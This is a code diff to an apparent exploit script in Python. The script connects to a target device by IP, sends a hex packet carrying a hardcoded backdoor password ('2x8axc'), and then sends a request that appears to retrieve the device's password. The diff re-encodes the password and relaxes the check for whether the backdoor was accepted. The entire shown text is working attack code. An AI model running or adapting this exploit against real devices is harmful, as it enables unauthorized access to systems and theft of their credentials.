@@ -32,19 +32,18 @@ except Exception as e:
     print("\n[ERROR] %s connecting to %s\nCheck the IP and try again" % (e, args.target ))
     sys.exit(-1)
 
-# 61646d696e   = admin (can be anything)
-# 327838617863 = 2x8axc
-#str_init =   ('000000001f000000500000008406000061646d696e00000000000000000000000000000000000' +
-str_init =   ('000000001f0000005000000084060000010101010100000000000000000000000000000000000' +
-              '00000000000000000000000000032783861786300000000000000000000000000000000000000' +
-              '00000000000000000000000000000001000000')
+password = binascii.hexlify(b'2x8axc').decode()
+
+str_init =    '000000001f0000005000000084060000000000000000000000000000000000000000000000000' \
+             f'000000000000000000000000000{password}0000000000000000000000000000000000000000' \
+              '000000000000000000000000000001000000'
 str_getPass = '00000000d300f9010000000090060000'
 
 s.send(binascii.unhexlify(str_init))
 resp = s.recv(1024)
 
-# Empty response = it didn't accept the backdoor password
-if not resp:
+# Short response = it didn't accept the backdoor password
+if not len(resp) > 16:
     print('\nSomething went wrong, exiting script...\n')
     sys.exit(-1)
 
